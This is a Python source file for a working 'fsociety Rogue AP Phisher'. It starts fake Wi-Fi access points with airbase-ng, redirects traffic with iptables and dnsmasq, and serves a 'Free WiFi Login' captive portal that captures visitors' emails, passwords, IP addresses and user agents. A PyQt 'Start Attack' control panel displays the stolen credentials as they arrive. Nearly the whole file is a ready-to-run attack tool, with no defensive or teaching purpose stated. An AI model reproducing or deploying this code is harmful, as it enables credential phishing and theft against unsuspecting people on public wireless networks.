import sys
import threading
import time
import os
import subprocess
import requests
from flask import Flask, request, render_template_string
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QPushButton, QTextEdit, QLabel
)
from PyQt5.QtGui import QColor, QPalette, QPixmap
from PyQt5.QtCore import Qt, pyqtSignal, QObject

# MAN banner for console
MAN_BANNER = """
__  __       _                 
|  \/  | __ _(_)_ __ ___  ___  
| |\/| |/ _` | | '__/ _ \/ __| 
| |  | | (_| | | | |  __/\__ \ 
|_|  |_|\__,_|_|_|  \___||___/ 

Rogue AP Phisher by fsociety
"""

# === Flask phishing server ===
app = Flask(__name__)
log_lines = []

login_page = '''
<!DOCTYPE html>
<html>
<head><title>Free WiFi Login</title></head>
<body style="background:#191919; color:#e74c3c; font-family: monospace;">
  <h2>Welcome to Free WiFi</h2>
  <form method="POST">
    Email: <input type="email" name="email" required><br><br>
    Password: <input type="password" name="password" required><br><br>
    <input type="submit" value="Connect" style="background:#e74c3c; color:#191919; font-weight:bold; padding:5px 10px; border:none; cursor:pointer;">
  </form>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def captive_portal():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        user_agent = request.headers.get('User-Agent')
        client_ip = request.remote_addr
        log_entry = f'IP: {client_ip} | UA: {user_agent} | Email: {email} | Pass: {password}'
        print(log_entry)
        log_lines.append(log_entry)
        return "<h3 style='color:#e74c3c; font-family: monospace;'>Connected! Enjoy the internet.</h3>"
    return render_template_string(login_page)

def run_flask():
    app.run(host='0.0.0.0', port=80, debug=False, use_reloader=False)

# === PyQt GUI with signals ===
class LoggerSignal(QObject):
    new_log = pyqtSignal(str)

class FsocietyGui(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("fsociety Rogue AP Phisher")
        self.setFixedSize(800, 600)

        palette = self.palette()
        palette.setColor(QPalette.Window, QColor("#191919"))
        self.setPalette(palette)

        self.bg_label = QLabel(self)
        self.bg_label.setGeometry(0, 0, 800, 600)

        # Download and load the fsociety mask image
        img_url = "https://i.pinimg.com/736x/30/b9/46/30b94658f685ffd183c8c442d2973d30.jpg"
        img_path = "/tmp/fsociety_mask.jpg"
        if not os.path.exists(img_path):
            try:
                r = requests.get(img_url, timeout=10)
                with open(img_path, "wb") as f:
                    f.write(r.content)
            except Exception as e:
                print("Failed to download image:", e)

        pixmap = QPixmap(img_path) if os.path.exists(img_path) else QPixmap()
        pixmap = pixmap.scaled(800, 600, Qt.KeepAspectRatioByExpanding, Qt.SmoothTransformation)
        self.bg_label.setPixmap(pixmap)
        self.bg_label.setStyleSheet("opacity: 0.08;")  # faint background

        layout = QVBoxLayout()
        layout.setContentsMargins(20, 20, 20, 20)

        title = QLabel("fsociety Rogue AP Phisher")
        title.setStyleSheet("color: #e74c3c; font-family: monospace; font-size: 24px; font-weight: bold;")
        title.setAlignment(Qt.AlignCenter)
        layout.addWidget(title)

        self.start_btn = QPushButton("Start Attack")
        self.start_btn.setStyleSheet("background: #e74c3c; color: #191919; font-weight: bold; padding: 10px;")
        self.stop_btn = QPushButton("Stop Attack")
        self.stop_btn.setStyleSheet("background: #555555; color: #eee; font-weight: bold; padding: 10px;")
        self.stop_btn.setEnabled(False)

        layout.addWidget(self.start_btn)
        layout.addWidget(self.stop_btn)

        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("""
            background: #111111;
            color: #e74c3c;
            font-family: monospace;
            font-size: 14px;
        """)
        layout.addWidget(self.log_output)

        self.setLayout(layout)

        self.start_btn.clicked.connect(self.start_attack)
        self.stop_btn.clicked.connect(self.stop_attack)

        self.logger_signal = LoggerSignal()
        self.logger_signal.new_log.connect(self.update_log)

        self.flask_thread = None
        self.airbase_procs = []
        self.dnsmasq_proc = None
        self.running = False

        self.log_thread = threading.Thread(target=self.log_watcher, daemon=True)
        self.log_thread.start()

    def log_watcher(self):
        last_len = 0
        while True:
            if self.running and len(log_lines) > last_len:
                for line in log_lines[last_len:]:
                    self.logger_signal.new_log.emit(line)
                last_len = len(log_lines)
            time.sleep(1)

    def update_log(self, line):
        self.log_output.append(line)
        self.log_output.moveCursor(self.log_output.textCursor().End)

    def setup_network(self):
        self.logger_signal.new_log.emit("[*] Setting up network interfaces...")

        # Start monitor mode on wlan0 (change if needed)
        subprocess.run(["airmon-ng", "start", "wlan0"])

        # Enable IP forwarding
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])

        # Flush iptables
        subprocess.run(["iptables", "-F"])
        subprocess.run(["iptables", "-t", "nat", "-F"])

        # Redirect HTTP traffic to local Flask server port 80
        subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                        "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"])
        subprocess.run(["iptables", "-I", "FORWARD", "-j", "ACCEPT"])

    def start_airbase(self):
        ssids = ["Iphone12", "...", "nemoze da se konektiras", "smrdam"]
        procs = []
        for ssid in ssids:
            cmd = ["airbase-ng", "-e", ssid, "-c", "6", "wlan0mon"]
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            procs.append(proc)
            self.logger_signal.new_log.emit(f"[*] Started fake AP: {ssid}")
            time.sleep(1)
        return procs

    def create_dnsmasq_conf(self):
        conf = """
interface=at0
dhcp-range=192.168.2.10,192.168.2.50,12h
address=/#/192.168.2.1
"""
        path = "/tmp/dnsmasq.conf"
        with open(path, "w") as f:
            f.write(conf)
        return path

    def start_dnsmasq(self):
        conf_path = self.create_dnsmasq_conf()
        proc = subprocess.Popen(["dnsmasq", "-C", conf_path])
        self.logger_signal.new_log.emit("[*] Started dnsmasq with config at /tmp/dnsmasq.conf")
        return proc

    def start_attack(self):
        if self.running:
            return
        self.running = True
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)

        self.setup_network()

        self.airbase_procs = self.start_airbase()
        self.dnsmasq_proc = self.start_dnsmasq()

        self.flask_thread = threading.Thread(target=run_flask, daemon=True)
        self.flask_thread.start()

        self.logger_signal.new_log.emit("[*] Attack started.")

    def stop_attack(self):
        if not self.running:
            return
        self.running = False
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)

        for proc in self.airbase_procs:
            proc.terminate()
            self.logger_signal.new_log.emit("[*] Stopped fake AP process.")

        if self.dnsmasq_proc:
            self.dnsmasq_proc.terminate()
            self.logger_signal.new_log.emit("[*] Stopped dnsmasq process.")

        subprocess.run(["iptables", "-F"])
        subprocess.run(["iptables", "-t", "nat", "-F"])
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"])

        self.logger_signal.new_log.emit("[*] Attack stopped. You may need to manually stop Flask server.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Run this script as root!")
        sys.exit(1)

    print(MAN_BANNER)

    app_qt = QApplication(sys.argv)
    gui = FsocietyGui()
    gui.show()
    sys.exit(app_qt.exec_())
